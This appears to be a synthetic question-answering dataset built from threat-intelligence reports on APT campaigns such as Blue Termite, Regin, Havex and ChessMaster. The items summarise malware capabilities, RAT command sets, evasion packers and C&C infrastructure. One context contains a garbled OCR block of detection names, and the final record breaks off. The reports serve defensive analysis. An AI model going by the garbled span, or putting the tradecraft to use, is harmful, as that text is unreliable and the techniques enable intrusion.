[
  {
    "instruction": "Context: Blue Termite\nBlue Termite is an APT attack the Japan 100% targeted, while the cyber attacks on Japanese pension mechanism also that it part of such efforts, the target is emphasized that it is \"Japan as a whole\" rather than by the same mechanism. It is assumed only attack is discovered in the same mechanism by chance thanks to information has been leaked, including the government agencies and news organizations, defense-related, energy-related, aerospace, financial, chemical,\nmanufacturing, research and academic institutions, further Until cloud servers of information and communication business, it revealed that at least 300 sites have been invaded by malware Blue Termite.\nRintaro Mr. Kawai Inc. Kaspersky President\nIshimaru Inc. Kaspersky information security lab security researcher\nBlue Termite is one of the attacks that the attacker group called \"CloudyOmega (Claudio mega)\" is deployed. The targeted attacks-mail and malware have been last fall, reported by Symantec and Trend Micro.\nFor example, in an e-mail that the source is \"health insurance union secretariat\", the file is attached that was disguised as a Word document file \"Notice of health insurance\", actually a self-extracting executable\norganization more than 300 locations in Japan, you have to be the thing that has been invaded by this malware.\nNote that this figure are those based on the number of unique IP addresses, it is going to be considered when using multiple IP addresses at the same organization. Also, its not always have evolved into activities such as information theft at all say (do not know), but, at least, malware is successful in the invasion, C & C number organization of considerable communication with the server has occurred I would that there.\nAfter the\nmalware infection, it called for confirmation of whether the environment is or attack. Directories and files in the PC, and to reference the operation to that\nAnd that in a business that provides cloud services, believed to have been stolen until the administrator authority of the mission-critical server body.\nIn fact, the\ncustomer web site that is operating on its cloud service, Blue Termite C & C server is installed a large number, it is found that Kaspersky Lab has 80 reviews alone was able to parse domain has been abused It is other,\ndomestic several thousand domain in May point in time you have to be in the hands of the attacker.\nC & C servers but were often placed abroad far, Blue those domestic C & C servers in Termite is used, the ratio is up to 93%. The communication of malware that had penetrated into the tissue, and that is difficult to judgment and cut off by the standard of overseas server.\nThe Blue Termite information of cloud services business who are under attack of, already it is assumed has to offer from Kaspersky Lab to the police, that should know at least the operators. However, at present business who announced that its I have not even one company.\nIn Kaspersky Lab, behavior after infection of these malware, back doors and hacking tools are using, from the commonality of the C & C server, cyber attacks on this time discovered the Japan pension mechanism, a series of Blue Termite that has continued from last fall\nDescription and was determined to be a part of the attack. \"Our will discard the confidence unfounded such as okay, everyone recognizes the fact that there is likely to be a target,\" it can be appealed the need.\nIt is to be noted that it is assumed to be suspect infection If impersonation files and malware names, such as the following, the tool is found in the PC.\nbecause in some cases the same name of the file exists, but is not that these are found PC is sure to infection, that it is better to suspected infection\nIn addition, the malware used in the Blue Termite is, in the Kaspersky Lab product to detect the name, such as the fallowing.\n\u0141\u0141\u0141\u0141\u0141\u0141\u0141\nBa.-.i=kdoor.'!Nln32.AGeF1t:\nBR.fkdoor.'iNin.3-2.ll:mdn.\u0141i\nnofan-Do'i.!'n1oader.Win:32.A\u00a3enlf\nTra,l}an.Win32.Agenil:\nHIEUR':Bit\u0141clao.r.WIFl:32-Generle\nHIEUR..Y,ojan.Wina2.1JeMJii=: l-!.i'.lekTixil.Win:32.ti.,S,\u0141li'lt t-lackiool.WIFl:32.Mlmlkati .. gen\nH.ac\u0141Tool.WIFl:32.WlnCred\nHa\u00a2\u0141TQQI.Win64.Aig\u0141iflit l-!!a\u00a2kT,x, l,Win64.. MimikJitl-\u0141n oot:-a-i.ilrus:IPS'aVTool.Viliin3i2. Messen\noot-;a-i.ilrm:IP'SWTool.V!liin:!i2. NetlJ'as\u00a3; n0h(l-\u0141il'tl,Q:Ri$kT\u00a2.OI.WinJ.2;.P-W:Oi,JMp uos:Dangerou50bjec.t.Multl.Genertc\n\u0141\u0141\u0141\u0141\u0141\u0141\u0141\nDetection name in the Kaspersky Lab products\nAnswer this question: What specific techniques did the Blue Termite APT employ to escalate privileges and gain access to critical systems, and how did they leverage cloud services in their attack strategy?",
    "output": "After initial infection, the Blue Termite malware performed reconnaissance to confirm the environment and determine if further attacks were feasible. It scanned directories and files on the infected PCs and referenced operations within businesses providing cloud services. The attackers successfully stole administrator authority for mission-critical servers, allowing them to install C&C servers on customer websites hosted on these cloud services. This strategy enabled the attackers to control a significant number of domains, with Kaspersky Lab identifying over 80 domains being abused. By leveraging cloud services, the attackers expanded their control and increased the difficulty of detection and mitigation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: coMfoo\nComfoo malware have been seen in conjunction with campaigns targeting sensitive entities in both Japan and India. We found a version of the Comfoo malware on the duojee.info server as well as an email attack that used the same version of Comfoo malware. In fact, the .DOC file used in the attack dropped an .EXE file with the same MD5 hash as the one found on the duojee.info server.\nTable 6: Sparksrv malware samples and C&C locations\nWhile at least two of the Comfoo variants are essentially the same, the traffic encryption methods used in the Comfoo sample found in connection with duojee.info differed from other Comfoo variants we've analyzed that are not directly related to the Luckycat campaign. The more common Comfoo malware samples we analyzed used custom encryption methods while the variant found on the duojee.info server utilized the Windows Cryptographic Application Programming Interface (API). This Comfoo variant's initial network communication sent the following information to the C&C server:\n\u2022 Randomly generated characters\n\u2022 MAC address\n\u2022 IP address\n\u2022 OS version\n\u2022 String, \"liberate,\" as campaign code\nThe attackers gather the following information from infected systems:\n\u2022 CPU, NETBIOS, and disk information\n\u2022 System, OS version, and account information\n\u2022 Network adapters, protocols, and configuration information\n\u2022 Installed applications as well as Internet Explorer (IE) and Browser Helper Object (BHO) information\nThe malware the attackers use is capable of receiving several commands.\nThis Comfoo email attack leverages the current situation in Tibet to encourage recipients to open a malicious attachment that exploits a vulnerability in Microsoft Office\u2014CVE-2010-3333, in order to drop a malware onto the target's system.\nAfter the decoy document opens, the Comfoo malware begins to communicate with johnnees.rkntils.10dig.net, which resolves to the IP address, 69.162.71.254\u2014the same host that some Sparksrv malware samples we analyzed use.\nThe samples in Table 9 connect to havefuns.rkntils.10dig.net or johnnees.rkntils.10dig.net, which both resolve to the same IP address\u201469.162.71.254.\nBig Headline: CONCLUSION\nTargeted attacks have been extremely successful, making the scope of the problem truly global. These have been affecting governments, militaries, defense industries, high-technology companies, intergovernmental organizations, nongovernmental organizations (NGOs), media organizations, academic institutions, and activists worldwide.\nTargeted attacks are not isolated smash-and-grab incidents. They are part of consistent campaigns that aim to establish persistent, covert presence in a target's network so that information can be extracted as needed.\nTargeted attacks may not be easy to understand but careful monitoring allows researchers to leverage the mistakes attackers make to get a glimpse inside their operations. Moreover, we can track cyber-espionage campaigns over time using a combination of technical and contextual indicators.\nThis paper specifically discussed the Luckycat campaign. In the course of our research, we discovered that it had a much more diverse target set than previously thought. Not only did the attackers target military research institutions in India, as earlier disclosed by Symantec, they also targeted sensitive entities in Japan and India as well as Tibetan activists. They used a diversity of infrastructure as well, ranging from throw-away free-hosting sites to dedicated VPSs.\nWe also found that the Luckycat campaign can be linked to other campaigns as well. The people behind it used or provided infrastructure for other campaigns that have also been linked to past targeted attacks such as the previously documented ShadowNet campaign.19\nUnderstanding the attack tools, techniques, and infrastructure used in the Luckycat campaign as well as how an individual incident is related to a broader campaign provides the context necessary for us to assess its impact and come up with defensive strategies in order to protect our customers.\nBig Headline: DEFENDING AGAINST APTS\nSufficiently motivated threat actors can penetrate even networks that use moderately advanced security measures. As such, apart from standard and relevant attack prevention measures and mechanisms such as solid patch management; endpoint and network security; firewall use; and the like, enterprises should also focus on detecting and mitigating attacks. Moreover, data loss prevention (DLP) strategies such as identifying exactly what an organization is protecting and taking into account the context of data use should be employed.\nMedium Headline: local anD external threat intelligence\nThreat intelligence refers to indicators that can be used to identify the tools, tactics, and procedures threat actors engaging in targeted attacks utilize. Both external and local threat intelligence is crucial for developing the ability to detect attacks early. The following are the core components of this defense strategy:\n\u2022 Enhanced visibility: Logs from endpoint, server, and network monitoring are an important and often underused resource that can be aggregated to provide a view of the activities within an organization that can be processed for anomalous behaviors that can indicate a targeted attack.\n\u2022 Integrity checks: In order to maintain persistence, malware will make modifications to the file system and registry. Monitoring such changes can indicate the presence of malware.\n\u2022 Empowering the human analyst: Humans are best positioned to identify anomalous behaviors when presented with a view of aggregated logs from across a network. This information is used in conjunction with custom alerts based on the local and external threat intelligence available.\n19\nTechnologies available today such as Deep Discovery provide visibility, insight, and control over networks to defend against targeted threats.20 Deep Discovery uniquely detects and identifies evasive threats in real time and provides in-depth analysis and actionable intelligence to prevent, discover, and reduce risks.\nMedium Headline: Mitigation anD cleanup strategy\nOnce an attack is identified, the cleanup strategy should focus on the following objectives:\n\u2022 Determine the attack vector and cut off communications with the C&C server.\n\u2022 Determine the scope of the compromise.\n\u2022 Assess the damage by analyzing the data and forensic artifacts available on compromised machines.\nRemediation should be applied soon afterward, which includes steps to fortify affected servers, machines, or devices into secure states, informed in part by how the compromised machines were infiltrated.\neDucating eMployees against social\nengineering\nSecurity-related policies and procedures combined with education and training programs are essential components of defense. Traditional training methods can be fortified by simulations and exercises using real spear-phishing attempts sent to test employees. Employees trained to expect targeted attacks are better positioned to report potential threats and constitute an important source of threat intelligence.\nMedium Headline: Data-centric protection strategy\nThe ultimate objective of targeted attacks is to acquire sensitive data. As such, DLP strategies that focus on identifying and protecting confidential information are critical. Enhanced data protection and visibility across an enterprise provides the ability to control access to sensitive data as well as monitor and log successful and unsuccessful attempts to access it. Enhanced access control and logging capabilities allow security analysts to locate and investigate anomalies, respond to incidents, and initiate remediation strategies and damage assessment.\n20\nMedium Headline: TREND MICRO\u2122\nTrend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat management solutions for businesses and consumers. A pioneer in server security with over 20 years' experience, we deliver top-ranked client, server and cloud-based security that fits our customers' and partners' needs, stops new threats faster, and protects data in physical, virtualized and cloud environments. Powered by the industry-leading Trend Micro\u2122 Smart Protection Network\u2122 cloud computing security infrastructure, our products and services stop threats where they emerge\u2014from the Internet. They are supported by 1,000+ threat intelligence experts around the globe.\nBig Headline: Operations\nThe 1st-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\n\u00bb Targeted emails that are contextually relevant (i.e., emails containing a decoy document of radiation dose measurement results sent some time after the Great East Japan Earthquake)\n\u00bb Exploited CVE-2010-3333 (aka, Rich Text Format [RTF] Stack Buffer Overflow Vulnerability) in several instances, although Adobe Reader and Flash Player vulnerabilities were also exploited\n\u00bb Used TROJ_WIMMIE or VBS_WIMMIE\u2014malware that take advantage of the Windows Management Instrumentation (WMI), making the backdoor component undetectable through file scanning\n\u00bb The WIMMIE malware, once inside the network, connects to a command-and-control (C&C) server via HTTP over port 80\n\u00bb Attackers heavily used free web-hosting services to host their C&C servers under a diverse set of domain names but also used virtual private servers (VPSs) for more stable operations\n\nWhat specific information does the Comfoo malware gather from infected systems, and why is this significant for the attackers?",
    "output": "The Comfoo malware gathers a wide range of information from infected systems, including CPU, NETBIOS, and disk information; system, OS version, and account information; network adapters, protocols, and configuration information; installed applications as well as Internet Explorer (IE) and Browser Helper Object (BHO) information. This information is significant for the attackers because it provides them with a comprehensive understanding of the target's environment, enabling them to tailor further attacks, move laterally within the network, and extract sensitive data more effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Regin/ Prax/ WarriorPride\nThe Regin malware campaign targeted international organizations from 2008 to 2011 and from 2013-2014. The malware may have remained undiscovered for at least five years prior to 2008. The complexity of the toolkit suggests the investment of significant resources over several years. In support of this assumption, Symantec notes that Regin appears to be designed for espionage campaigns that last several years.\nThe malware is allegedly the product of a collaboration between the United States NSA and the British GCHQ. This allegation derives from a document leaked to Der Spiegel and the Intercept by Edward Snowden. The malware primarily targeted systems belonging to private individuals, small businesses, and telecommunications companies in Russia, Saudi Arabia, Mexico, Ireland, and to a lesser extent, India, Afghanistan, Iran, Belgium, Austria, and Pakistan.\nSymantec notes that the framework has been used for mass surveillance against \"government organizations, infrastructure operators, businesses, researchers, and private individuals. \" Nearly half of the attacks targeted private individuals. The quarter of the infections against telecommunication infrastructure was likely an attempt to gain access to the calls routed through the networks. Regin does not have a clear infection vector; though, Symantec suspects that some infections are the result of watering-hole attacks and zero-day exploits.\nRegin consists of a trojan and a backdoor that are widely customizable to fit the target. The platform excels at remaining undetected and obfuscating its indicators of compromise. Regin is a modular platform, reminiscent of Flame, Duqu, and Stuxnet. The Regin backdoor is a five stage modular component and each stage after the first is hidden and encrypted. After each successful installation of a stage, the next stage is decrypted and installed. Each piece provides as little information as possible about the total component. If any stage fails then the installation terminates. The flexibility of the Regin platform means that the actor can customize the payload to the target. Consequently, Regin has dozens of discovered payloads and likely has many more that remain known only to the actor. In general, the platform features several remote access trojans (RATs), and tools to capture screenshots, log keystrokes, monitor network traffic, steal credentials, recover deleted files, and hijack the point and click functions of the mouse. According to Symantec, advanced payloads also contained \"Microsoft IIS web server traffic monitor and a traffic sniffer of the administration of mobile telephone base controllers.\" The platform also features anti-forensic capabilities, a custom-built encrypted virtual file system (EVFS), and RC5 encryption.  Communication with the C&C servers occurs over ICMP/ ping, embedded commands in HTTP cookies, and custom TCP and UDP protocols.\nQ: Why is the Regin malware considered to be highly sophisticated, and what are the key features that contribute to its stealth and effectiveness?",
    "output": "The Regin malware is considered highly sophisticated due to its modular design and advanced obfuscation techniques. Key features contributing to its stealth and effectiveness include its five-stage modular component, where each stage is hidden and encrypted, and only decrypts the next stage upon successful installation. This design minimizes the information exposed about the total component and allows the malware to terminate installation if any stage fails. Additionally, Regin includes anti-forensic capabilities, a custom-built encrypted virtual file system (EVFS), and RC5 encryption. Its communication with command and control (C&C) servers occurs over various protocols, including ICMP/ping, embedded commands in HTTP cookies, and custom TCP and UDP protocols, further enhancing its stealth.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nShould answers be available, their numbers would be printed as a debug message and processed and the following would be displayed as a debug message:\nANSWER\n1 (meaning one answer)\nConnecting post: HTTP:\\\\C&C server with botID as parameter\n8 (size of answer * 2 as it is converted to unicode)\nreqstream\nwrote to stream\nThis essentially does a POST request to the C&C server using the BOTID and the following User Agent: \"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0\" On the C&C server side, a new file would be created named after the BOTID with the extension \".ans\".\nHere is an example of such a file:\nThe date of the post can be found, the base64 encoded C&C server and the unicode string Answer, modified in this example.\nThis is how the attackers get an answer (result) from a given task.\n5.3 Network communication - WorkReceive\nThe WorkReceive function essentially does a GET request on the C&C server in order to receive a task to complete on the infected computer. The task to execute is encrypted and base64 encoded\nand returned between the \"havex\" tags. Here is an example without any task between the tags:\nThe trojan calls the DataParser to locate the task:\nThe task is decrypted, decoded and stored in the \"KeyWork\\\\[name_from_version_information]\\\\ work\" subkey.\n5.4 WorkBegin - Task Dispatcher\nJust before the WorkBegin method is called, the \"begin work\" debug message is displayed. The first thing WorkBegin does is decrypt and unbase64 the answer returned from the DataParser.\nAfterwards, two things are extracted: The command to execute and the data parameter for the command.\n5.5 The Commands\nThe final step calls the command dispatcher, which executes the command sent by the attackers.\n5.5.1 SCR\nThe \"SCR\" command is used by the attacker to request a Screen Capture of the infected computer. Typical GDI functions are used, including: CreateCompatibleDC, GetSystemMetrics and CreateCompatibleBitmap.\nThe screenshots are made as JPG files. If a screenshot already exist, it is deleted prior the creation of a new one.\n5.5.2 DIR / DIS\nThe \"DIR\" and \"DIS\" commands are used to generate Directory listings using the XML format.\n5.5.3 TIM\nThe TIM command is responsible for updating the Timeout parameter in the registry. The command finds where the KeyWork is located and updates the Time out with the parameter provided to the command.\n5.5.4 UPD\nThe UPD command is used to run an updated version of the RAT. The currently running RAT executes the update and exits. Upon execution, the newly updated version will delete the old RAT using the Cleaner method described earlier.\n5.5.5 FID\nChange Folder attributes.\n5.5.6 LIB\nThe LIB command is used to load a DLL on the infected machine. It simply uses LoadLibrary.\n5.5.7 FIR\nThe FIR command is used to run an executable on the infected computer. The process is created with hidden windows to stay unnoticed.\n5.5.8 UPS\nThe UPS command is used to update the C&C server in the registry.\n5.5.9 FIS\nThe FIS command is used to check if the file passed as parameter exists on the infected computer.\n5.5.10 FIT\nThe FIT command is used to delete a file passed as parameter to the command if it exists on the infected computer.\n5.5.11 CMD\nThe CMD command is used to execute a command on the infected machine using cmd.exe\n5.5.12 KEY\nThe KEY command is used to update the Priv and Pub key in the registry.\n5.6 Sleep and Loop again\nOnce the commands have been executed, the debug message \"End work\" is displayed. The malware then sleeps for a random amount of time and the main loop continues. If the commands were executed, all results stored in the registry will be POSTED to the server via the AnsSend method.\nThe malware loops forever waiting for new orders from the attackers.\n\nExplain the role and functionality of the various commands used by the Crouching Yeti malware, such as SCR, DIR/DIS, TIM, UPD, and others. How do these commands contribute to the overall operation of the malware, and what specific actions do they perform on the infected system?",
    "output": "The Crouching Yeti malware uses several commands to control the infected system. The 'SCR' command captures the screen using GDI functions and saves it as a JPG file. The 'DIR' and 'DIS' commands generate directory listings in XML format. The 'TIM' command updates the Timeout parameter in the registry. The 'UPD' command runs an updated version of the RAT and deletes the old version. The 'FID' command changes folder attributes. The 'LIB' command loads a DLL using LoadLibrary. The 'FIR' command runs an executable with hidden windows. The 'UPS' command updates the C&C server address in the registry. The 'FIS' command checks if a file exists. The 'FIT' command deletes a specified file. The 'CMD' command executes a command using cmd.exe. The 'KEY' command updates the private and public keys in the registry. These commands allow the attackers to remotely control the infected system, gather information, and maintain persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Appendix 3 Introduction of Qi'anxin Mobile Products\nQi'anxin Mobile Terminal Security Management System ( Tianji ) is aimed at customers in public security , justice , government , finance , operators , energy , manufacturing and other industries . Terminal control and strong terminal security features _A unique mobile terminal security management product . The product is based on Qi Anxin 's security technology accumulation and operation experience on massive mobile terminals , from hardware , OS , application , data to link and other multi -levelSecurity protection solutions to ensure the security of enterprise data and applications in mobile terminals .\nQi'anxin Mobile Situational Awareness System is a mobile situational awareness management product jointly launched by Qi'anxin Security Supervision BG Situational Awareness First Division and its partner Qi'anxin Virus Response Center Mobile Team. Different from traditional mobile security vendors, which focus on APP production and release, and provide customers with APP reinforcement, detection, analysis, etc.; mobile situational awareness is oriented to customers with regulatory responsibilities, focusing more on APP download and use, and find out the scope of the jurisdiction. The use of APP provides customers with functions such as APP illegal detection, compliance analysis, and traceability.\n\nBased on the above text, answer a question. How does the Qi'anxin Mobile Terminal Security Management System (Tianji) ensure the security of enterprise data and applications in mobile terminals, and what makes it unique compared to traditional mobile security vendors?",
    "output": "The Qi'anxin Mobile Terminal Security Management System (Tianji) ensures the security of enterprise data and applications in mobile terminals through multi-level security protection solutions that cover hardware, operating system, application, data, and network links. This comprehensive approach is based on Qi'anxin's extensive security technology and operational experience with large-scale mobile terminals. Unlike traditional mobile security vendors that focus on APP production, release, and services like reinforcement, detection, and analysis, Tianji stands out by offering a unique product aimed at various industries including public security, justice, government, finance, operators, energy, and manufacturing. Additionally, Qi'anxin's Mobile Situational Awareness System, developed in collaboration with the Qi'anxin Virus Response Center Mobile Team, focuses on regulatory customers and provides functions such as APP illegal detection, compliance analysis, and traceability, emphasizing the usage and download of apps within the jurisdiction.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: by Benson Sy, CH Lei, and Kawabata Kohei\nFrom gathering intelligence, using the right social engineering lures, and exploiting vulnerabilities to laterally moving within the network, targeted attacks have multifarious tools at their disposal. And like in a game of chess, they are the set pieces that make up their modus operandi.\nJuly 27, 2017\nTake for instance the self-named ChessMaster, a campaign targeting Japanese academe, technology enterprises, media outfits, managed service providers, and government agencies. It employs various poisoned pawns in the form of malware-laden spear-phishing emails containing decoy documents. And beyond ChessMaster's endgame and pawns, we also found red flags that allude to its links to APT 10, also known as menuPass, POTASSIUM, Stone Panda, Red Apollo, and CVNX.\nChessMaster's name is from pieces of chess/checkers/draughts we found in the resource section of the main backdoor they use against their targets: ChChes, which Trend Micro detects as BKDR_CHCHES.\nWhat makes the campaign unique is its arsenal of tools and techniques:\n. The LNK files execute Command Prompt that downloads a , which would either directly drop or reflectively load ChChes into the machine. The latter method makes ChChes a fileless malware.\nSelf-extracting archive (SFX). An archive that drops an executable (EXE), a dynamic-link library (DLL), and a binary file (.BIN). Upon their extraction, malicious code is injected into the process of a legitimate file/application (DLL hijacking). ChessMaster takes it up a notch via to trigger the malicious DLL's function.\nRuntime packers. Throughout its campaign, ChChes used three packers to obfuscate itself and avoid detection. The first had no encryption and a varied loader code. The second had a buggy (or anti-emulation) exclusive OR (XOR) encryption technique. The third added an AES algorithm on top of XOR encryption. Their compile dates overlap, which indicates ChChes' authors take cues and fine-tune their malware.\nSecond-stage payloads. Additional malware are introduced to the infected system for persistence. These are actually variants of ChChes that use similar entry points but different and encrypted C&C communication.\nHacking Tools. ChessMaster draws on legitimate email and browser password recovery and dumping tools they've misused and modified for their campaign. These can restore forgotten passwords, which are then dumped and retrieved. Lateral movement and further attacks can be worked out from here.\nTinyX. A version of sans the plug-in functionality that allows it to adopt new capabilities. TinyX is bundled separately in spear-phishing emails.\nRedLeaves. A second-stage backdoor that like the open-source and fileless remote access Trojan (RAT) , which is known for enabling lateral movement in the infected systems. RedLeaves adopted capabilities from PlugX. In April, a RedLeaves variant named himawari (Japanese for sunflower) emerged capable of evading YARA rules released during that time.\n\nWhat are the different packers used by the ChChes malware throughout the ChessMaster campaign, and how do these packers contribute to the malware's evasion techniques?",
    "output": "A: Throughout its campaign, ChChes used three different runtime packers to obfuscate itself and avoid detection. The first packer had no encryption and a varied loader code. The second packer employed a buggy (or anti-emulation) exclusive OR (XOR) encryption technique. The third packer added an AES algorithm on top of XOR encryption. The use of these packers contributes to the malware's evasion techniques by making it more difficult for security software to detect and analyze the malware. The overlapping compile dates of these packers indicate that ChChes' authors are actively taking cues and fine-tuning their malware to stay ahead of detection methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Very Small Headline: 3.3 Hostilities in Eastern Ukraine (April 2014 \u2013 Present)\nFollowing the annexation of Crimea, the world's attention was quickly drawn to the onset of hostilities in eastern Ukraine. Protesters from the Russian speaking minority in the cities of Donetsk, Luhansk, and Kharkiv occupied government buildings and called for independence.33 Pro-Russian 'separatist groups' emerged. The Ukrainian authorities responded by starting an 'anti-terrorist operation'. On 17 April, the first violent deaths occurred in eastern Ukraine; in the Black Sea city of Odessa, 42 people died in clashes. On 11 May, Donetsk and Luhansk declared themselves to be independent republics.\nPetro Poroshenko was elected President of Ukraine on 25 May, but this poll could not be held in large parts of the conflict-ridden east. A cease-fire agreement,34 signed in Minsk on 5 September 2014, collapsed when fighting started again in January 2015. A second agreement signed in the capital of Belarus on 11 February, Minsk II, provided for a ceasefire, the withdrawal of heavy weapons from the front line, a release of prisoners of war, and constitutional reform in Ukraine.35 This second agreement has also been violated, although currently, in September 2015, the situation seems to have calmed down. NATO reported the active involvement of Russian troops in eastern Ukraine,36 but Russia has consistently denied involvement.\nCyber operations have continued throughout the conflict. In May 2014, cyber means were used in an attempt to disrupt the presidential elections, including an effort to falsify the outcome. CyberBerkut may have taken part and some analysts believe that Russia was behind it.37 In August 2014, hackers conducted a DDoS attack against Ukraine's election commission website, just prior to the parliamentary polls.38\nThere are numerous publicly-known examples of intelligence gathering through cyber means, all of which reportedly have a Russian connection. In the Summer of 2014, the Blackenergy spyware was used against Ukrainian government institutions.39 In August, the Snake malware was employed against the Ukrainian Prime Minister's Office, as well as a number of foreign embassies.40 In April 2015, Looking-lass reported on a Russian campaign to extract classified documents from Ukrainian military and law enforcement agencies in an effort to support pro-Russian military\noperations in Ukraine.41 ISight Partners reported that Russian Sandworm hackers used a 'zero-day' vulnerability to hack NATO and Ukraine in a cyber espionage campaign.42 The list of targets was not confined to Ukrainian sites. In January 2015, CyberBerkut claimed responsibility for a cyber attack on German Government sites, demanding that Germany end its support to the Ukrainian government.43\n33 'Ukraine crisis: Timeline', BBC News, accessed 1 August 2015, (<http://www.bbc.com/news/world-middle-east-26248275>)http://www.bbc.com/news/world-middle-east-26248275.\n34 Protocol on the results of consultations of the Trilateral Contact Group, Minsk, 5 September 2014, (<http://mfa.gov.ua/en/news-feeds/foreign-offices-news/27596-protocolon-the-results-of-consultations-of-the-trilateral-contact-group-minsk-05092014>)http://mfa.gov.ua/en/news-(<http://mfa.gov.ua/en/news-feeds/foreign-offices-news/27596-protocolon-the-results-of-consultations-of-the-trilateral-contact-group-minsk-05092014>)feeds/foreign-offices-news/27596-protocolon-the-results-of-consultations-of-the-trilateral-contact-group-minsk-05092014.\n35 'Ukraine ceasefire: New Minsk agreement key points', BBC News, 12 February 2015, (<http://www.bbc.com/news/world-europe-31436513>)http://www.bbc.com/news/world-eu-(<http://www.bbc.com/news/world-europe-31436513>)rope-31436513.\n36 See for example: 'NATO Commander: 'Conditions in Eastern Ukraine Have to Change'', OPB, 6 February 2015, http://www. opb.org/news/article/npr-nato-commander-conditions-in-eastern-ukraine-have-to-change/, and 'Nato urges Russia to stop fuelling Ukraine conflict', The Irish Times, 15 April 2015, http://www.irishtimes.com/news/world/europe/nato-urges-russia-to-stop-fuelling-ukraine-conflict-1.2176718.\n37 Mark Clayton. 'Ukraine election narrowly avoided 'wanton destruction' from hackers (+video)', The Christian Science Monitor, 17 June 2014, (<http://www.csmonitor.com/World/Passcode/2014/0617/Ukraine-election-narrowly-avoided-wanton-destruction-from-hackers-video>)http://www.csmonitor.com/World/Passcode/2014/0617/Ukraine-election-narrowly-avoided-wanton-destruc-(<http://www.csmonitor.com/World/Passcode/2014/0617/Ukraine-election-narrowly-avoided-wanton-destruction-from-hackers-video>)tion-from-hackers-video.\n38 'Hackers attack Ukraine election website', Presstv, 25 October 2014, (<http://www.presstv.ir/detail/2014/10/25/383623/ukraines-election-website-hacked/>)http://www.presstv.ir/detail/2014/10/25/383623/ukrai-(<http://www.presstv.ir/detail/2014/10/25/383623/ukraines-election-website-hacked/>)nes-election-website-hacked/. See also: Vitaly Shevchenko, 'Ukraine conflict: Hackers take sides in virtual war', BBC News, 20 December 2014, http://www.bbc.com/news/world-europe-30453069.\n39 David Gilbert. 'BlackEnergy Cyber Attacks Against Ukrainian Government Linked to Russia', International Business Times, 26 September 2014, (<http://www.ibtimes.co.uk/blackenergy-cyber-attacks-against-ukrainian-governm)ent-linked-russia-1467401>)http://www.ibtimes.co.uk/blackenergy-cyber-attacks-against-ukrainian-governm)ent-linked-russia-1467401.\n40 Sam Jones. 'Russia-linked cyber attack on Ukraine PM's office', CNBC, 8 August 2014, (<http://www.cnbc.com/id/101905588>)http://www.cnbc.com/id/101905588.\nOn the pro-Ukraine side, the Ukrainian Cyber Troops reportedly claimed to have hacked into Russian interior ministry servers and CCTV cameras in separatist-controlled eastern Ukraine.44\nVery\nAnswer this question: What types of malware were employed against Ukrainian government institutions and other entities during the conflict, and how were they utilized for intelligence gathering?",
    "output": "Several types of malware were employed against Ukrainian government institutions and other entities for intelligence gathering. In the summer of 2014, the BlackEnergy spyware was used against Ukrainian government institutions. In August 2014, the Snake malware was employed against the Ukrainian Prime Minister's Office, as well as a number of foreign embassies. In April 2015, Lookingglass reported on a Russian campaign to extract classified documents from Ukrainian military and law enforcement agencies in an effort to support pro-Russian military operations in Ukraine. Additionally, iSight Partners reported that Russian Sandworm hackers used a 'zero-day' vulnerability to hack NATO and Ukraine in a cyber espionage campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: C&C servers\nDuring our research into Operation Groundbait we have observed a number of C&C server domain names and IP addresses. Most of them are located in Ukraine and are hosted by Ukrainian hosting providers.  contains a more comprehensive listing.\nOne of the C&C servers, gils.ho[.]ua has been in operation since 2008, according to information from the hosting company. In order to hide their illegal activity, the attackers created a bogus website. The website is dedicated to the capital of Ukraine\u2014Kiev.\nDuring our investigation we obtained access to an Operation Groundbait C&C server that was misconfigured and allowed a public directory listing.\nAt one point, the root directory contained 33 subdirectories, with an individual folder for each victim. This means that the server was used to control 33 Priko-rmka-infected computers. The name of each sub-folder contains an Operator ID, a Campaign ID and the architecture of the infected device.\nEach folder contains two sub-folders with the following names: data and util.  The first folder contains encrypted exfiltrated data and the second folder has  encrypted Prikormka modules.\nIn addition to the data and util folders, each victim-specific subfolder contained two plain-text log files: journal and log, revealing interesting findings about the malware operators and their victims.\nThe log file contains the communication log between the server and the infected computer: specifically, the IP address of the infected computer, date and time, type of request (GET or POST), the size of request, and the status of Prikormka modules (in cases where it is a GET request).\nAccording to our analysis of the communication logs from one server there were 33 victims, located mostly in Eastern Ukraine. In addition to those, there were a few victims located in Russia or in Kiev, Ukraine.\nThe analysis of logs revealed that several malware operators connected to the server using various internet service providers in Kiev and Mariupol. Some of them accessed the C&C via the Tor network.\nThe journal file contains the communication log between the server and the malware operator. The communication log contains the IP address of the operator, the date, time, and type of request. It should be noted that once downloaded by the malware operator, the file with exfiltrated data gets removed from the server.\nBig Headline: Attribution\nIn this section we make an attempt to identify the origin of the threat based on clues that were intentionally or unintentionally left by the attackers:\n\u2022 Most of Prikormka's C&C servers are located in Ukraine and hosted by Ukrainian hosting companies\n\u2022 The group behind this threat has fluent knowledge of the Russian and Ukrainian languages, as evidenced by text in the decoy documents and malware binaries\n\u2022 Some of the PDB-paths revealed that attackers used directories with names in Russian\n\u2022 All analyzed Prikormka droppers contained language codes that correspond to Ukrainian (hexadecimal code 0x0422) or Russian (0x0419) languages in their PE resources (Figure 37)\n\u2022 The compilation timestamps of Prikormka binaries suggest that the malware authors operate in the Eastern European time zone\n\u2022 According to C&C server logs, a number of malware operators participating in Operation Groundbait have been making connections through various internet providers in two Ukrainian cities: Kiev and Mariupol.\nInterestingly, the droppers from earlier period (2012-2015) do contain resources with Russian language codes. The malware authors gradually switched from Russian to Ukrainian in the mid of 2015.\nFigure 38 depicts the distribution of the compilation hour of Prikormka samples.\nWe can deduce from this that the malware authors work from 6.00 to 16.00 (UTC), 